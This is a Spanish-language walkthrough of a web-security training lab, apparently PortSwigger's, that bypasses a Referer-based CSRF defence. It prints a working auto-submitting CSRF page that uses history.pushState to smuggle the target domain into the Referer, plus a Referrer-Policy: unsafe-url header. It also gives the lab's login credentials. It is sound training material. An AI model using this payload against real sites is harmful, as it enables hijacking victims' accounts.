`TAREA:` La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta detectar y bloquear solicitudes entre dominios, pero el mecanismo de detección puede eludirse. Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: `wiener:peter`

iniciamos sesión en el laboratorio interceptamos la solicitud de cambio de contraseña y la enviamos al repeater 
![[Pasted image 20250722123446.png]]

en este caso lo primero que hacemos es validar cual es la porción del referer que se esta validando. hasta que encontramos una respuesta `400 Bad Request` esto nos indica que la solicitud ya no se esta validando correctamente por lo que podemos identificar hasta donde llega la validación del referer.
![[Pasted image 20250722123602.png]]

creamos nuestro CSRF-POC y podemos usar el parámetro `history.pushState('', '', '/');` el primer valor hace referencia al estatus el segundo valor es el titulo y el tercero es la URL. en este caso nos interesa el de la url. 

`NOTA:` la URL puede ser relativa o absoluta. pero debe provenir desde el origen principal. en este caso usamos la url relativa ya que proviene de dicho origen.

```python
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a60003404692c1a810ac58f00300054.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a60003404692c1a810ac58f00300054.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

inyectando la URL relativa en el tercer valor del parámetro `history.pushState` 
![[Pasted image 20250722125434.png]]

Si guarda el exploit y lo prueba haciendo clic en "Ver exploit", podría volver a aparecer el error "Encabezado de referencia no válido". Esto se debe a que muchos navegadores eliminan la cadena de consulta del encabezado de referencia de forma predeterminada como medida de seguridad. Para anular este comportamiento y asegurarse de que la URL completa se incluya en la solicitud, vuelva al servidor de exploits y agregue el siguiente encabezado a la sección "Encabezado":

```python
Referrer-Policy: unsafe-url
```

![[Pasted image 20250722130031.png]]